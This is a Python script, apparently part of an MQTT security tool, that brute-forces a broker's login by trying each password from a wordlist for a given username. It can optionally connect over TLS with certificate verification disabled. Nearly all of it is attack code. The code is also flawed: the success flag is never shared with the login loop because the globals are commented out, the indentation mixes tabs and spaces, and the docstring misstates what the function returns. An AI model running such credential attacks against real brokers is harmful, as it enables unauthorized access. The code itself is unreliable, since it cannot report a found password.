import paho.mqtt.client as mqtt
import ssl
from time import sleep
from random import randint
import sys

# callback function for the connect request
def on_connect(client, userdata, flags, rc):
	if rc==0:
		# global connected
		# global password
                connected = True

"""Performs the brute force attack
Parameters:
    ip_target (str): The ip of the broker
    port (int): The port to connect to
    username (str): The username to use when trying all passwords from the wordlist
    wordlist_path (str): The path to the wordlist file used to get the passwords to try
    tls_cert (str): The path to the CA certificate used to connect over TLS

Returns:
    results ([bool, str]): array containing a password and the related boolean indicating if the
                           passwod worked or not
"""
def brute_force(ip_target, port, username, wordlist_path, tls_cert, client_cert, client_key):
	# global connected
	# global password
	connected = False
        # open the wordlist file
	with open(wordlist_path) as f:
                # for each password we try to connect to the broker using it along with the username
                # provided as paramenter of the function
		for line in f:
			password = line[:-1]

                        # try to connect
			client = mqtt.Client()
			client.on_connect = on_connect
			client.username_pw_set(username, password)
			print('trying: '+username + ', '+ password)

                        # if the tls_cert value is different from None, try to connect over TLS
			if tls_cert != None:
				client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE,
					tls_version=ssl.PROTOCOL_TLS, ciphers=None)
				client.tls_insecure_set(True)
			client.connect(ip_target,port)
			client.loop_start()
			sleep(3)
			client.loop_stop()
                        # if we are able to connect, we break the loop and we return the list of passwords and
                        # if each password was working or not
			if connected:
				break
	results = [connected,password]
	return results
